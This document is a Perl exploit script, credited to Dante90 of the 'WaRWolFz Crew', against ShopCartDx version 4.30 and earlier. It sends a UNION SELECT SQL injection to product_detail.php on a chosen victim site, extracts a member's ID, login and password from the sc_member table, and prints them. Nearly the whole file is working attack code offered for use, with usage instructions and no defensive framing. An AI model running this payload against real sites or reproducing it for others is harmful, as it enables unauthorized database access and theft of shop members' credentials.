#!/usr/bin/perl
#[0-Day] ShopCartDx <= v4.30 (product_detail.php) Remote SQL Injection
Exploit
#Coded By Dante90, WaRWolFz Crew
#Bug Discovered By: Dante90, WaRWolFz Crew

use LWP::UserAgent;
use HTTP::Cookies;
use strict;

my $Member_ID = shift or usage();

my $HostName = "http://www.victime_site.org/path/"; #Insert Victime Web Site
Link (Example: http://e-topbiz.com/trafficdemos/shopcartdx1/)
my $Referrer = "http://warwolfz.altervista.org/";

sub SQL_Injection{
    my ($MID) = @_;
    return "./product_detail.php?cid=9&pid=-1 UNION SELECT
1,2,CONCAT_WS(CHAR(32,58,32),mid,login,password),4,5,6,7,8,9,10,11,12,13,14,15,16
FROM sc_member WHERE mid=${MID}/*";
}

my $Cookies = new HTTP::Cookies;
my $UserAgent = new LWP::UserAgent(
            agent => 'Mozilla/5.0',
            max_redirect => 0,
            cookie_jar => $Cookies,
        ) or die $!;

my $Get = $UserAgent->get($HostName.SQL_Injection($Member_ID));

if($Get->content =~ /([0-9]{1,5}) : ([a-zA-Z0-9-_.]{2,15}) :
([a-zA-Z0-9]{1,15})/i){
    refresh($HostName, $1, $2, $3);
    print " * Exploit Successed                                  *\n";
    print " ------------------------------------------------------\n\n";
    system("pause");
}else{
    refresh($HostName, "", "", "");
    print " * Error extracting sensible data.\n";
    print " * Exploit Failed                                     *\n";
    print " ------------------------------------------------------ \n\n";
}


sub usage{
    system("cls");
    {
        print " \n [0-Day] ShopCartDx <= v4.30 (product_detail.php) Remote
SQL Injection Exploit\n";
        print " ------------------------------------------------------ \n";
        print " * USAGE:                                             *\n";
        print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
        print " * perl name_exploit.pl [uid]                         *\n";
        print " ------------------------------------------------------ \n";
        print " *         Powered By Dante90, WaRWolFz Crew          *\n";
        print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
        print " ------------------------------------------------------ \n";
    };
    exit;
}

sub refresh{
    system("cls");
    {
        print " \n [0-Day] ShopCartDx <= v4.30 (product_detail.php) Remote
SQL Injection Exploit\n";
        print " ------------------------------------------------------ \n";
        print " * USAGE:                                             *\n";
        print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
        print " * perl name_exploit.pl [uid]                         *\n";
        print " ------------------------------------------------------ \n";
        print " *         Powered By Dante90, WaRWolFz Crew          *\n";
        print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
        print " ------------------------------------------------------ \n";
    };
    print " * Victime Site: " . $_[0] . "\n";
    print " * Member ID: " . $_[1] . "\n";
    print " * Login: " . $_[2] . "\n";
    print " * Password: " . $_[3] . "\n";
}

#WaRWolFz Crew

